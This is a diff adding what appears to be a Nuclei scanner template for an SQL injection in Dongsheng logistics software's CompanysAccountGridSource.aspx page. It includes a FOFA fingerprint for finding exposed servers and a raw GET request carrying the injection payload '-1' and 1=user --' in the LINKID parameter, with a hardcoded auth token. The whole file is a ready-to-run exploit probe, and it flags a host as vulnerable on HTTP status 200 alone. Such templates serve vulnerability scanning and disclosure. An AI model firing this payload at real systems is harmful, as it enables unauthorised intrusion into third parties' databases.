@@ -1,0 +1,29 @@
+id: poc-ll7hvf44f3egq4yl
+info:
+  name: 东胜物流软件CompanysAccountGridSourceSQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ll7hvf44f3egq4yl'
+  tags: rce,sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ll7hvf44f3egq4yl
+    fofa: body="CompanysAdapter.aspx"
+http:
+- raw:
+  - 'GET /Shipping/CompanysAccountGridSource.aspx?LINKID=-1%27%20and%201=user%20--&read=exist HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    x-auth-token: 36ef438edd50bf8dd51fba642a82c3b7d272ff38
+
+    Content-Type: text/html; charset=utf-8
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
